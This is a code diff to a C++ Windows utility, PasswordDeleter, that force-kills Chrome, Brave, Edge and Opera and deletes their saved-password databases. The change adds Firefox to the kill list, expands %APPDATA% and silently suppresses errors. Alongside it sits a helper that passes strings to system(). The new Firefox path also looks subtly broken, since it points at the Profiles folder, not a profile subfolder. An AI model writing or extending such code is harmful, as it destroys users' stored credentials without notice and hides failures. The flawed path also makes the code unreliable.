@@ -3,6 +3,8 @@
 #include <vector>
 #include <Windows.h>
 #include <filesystem>
+#include <thread>
+#include <chrono>
 
 namespace fs = std::filesystem;
 
@@ -39,7 +41,8 @@ void PasswordDeleter::destroyPass() {
         "chrome.exe",  // Google Chrome
         "brave.exe",   // Brave browser
         "msedge.exe",  // Microsoft Edge
-        "opera.exe"    // Opera browser
+        "opera.exe",   // Opera browser
+        "firefox.exe"  // Mozilla Firefox
     };
 
     // Kill browser processes first
@@ -53,7 +56,8 @@ void PasswordDeleter::destroyPass() {
         {"%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default", "Login Data"},
         {"%USERPROFILE%\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default", "Login Data"},
         {"%USERPROFILE%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default", "Login Data"},
-        {"%USERPROFILE%\\AppData\\Roaming\\Opera Software\\Opera Stable", "Login Data"}
+        {"%USERPROFILE%\\AppData\\Roaming\\Opera Software\\Opera Stable", "Login Data"},
+        {"%APPDATA%\\Mozilla\\Firefox\\Profiles", "logins.json"}  // Firefox profile and password database
     };
 
     // Loop through all browsers and delete password database
@@ -70,6 +74,15 @@ void PasswordDeleter::destroyPass() {
             }
         }
 
+        // Expand %APPDATA% for Firefox
+        char appData[MAX_PATH];
+        if (GetEnvironmentVariableA("APPDATA", appData, sizeof(appData))) {
+            size_t pos = browserPath.find("%APPDATA%");
+            if (pos != std::string::npos) {
+                browserPath.replace(pos, 9, appData);
+            }
+        }
+
         // Delete the password database (Login Data)
         deletePasswordDatabase(browserPath, dbName);
     }
@@ -83,18 +96,17 @@ void PasswordDeleter::killBrowserProcesses(const std::vector<std::string>& brows
 
 void PasswordDeleter::deletePasswordDatabase(const std::string& browserProfilePath, const std::string& dbName) {
     fs::path dbFilePath = fs::path(browserProfilePath) / dbName;
-    
+
     try {
         if (fs::exists(dbFilePath)) {
             fs::remove(dbFilePath);
         }
     }
-    catch (const std::exception& e) {
-        exit;
+    catch (const std::exception&) {
+        // Suppress errors
     }
 }
 
 void PasswordDeleter::runCommand(const std::string& command) {
     system(command.c_str());  // Run the system command
 }
-
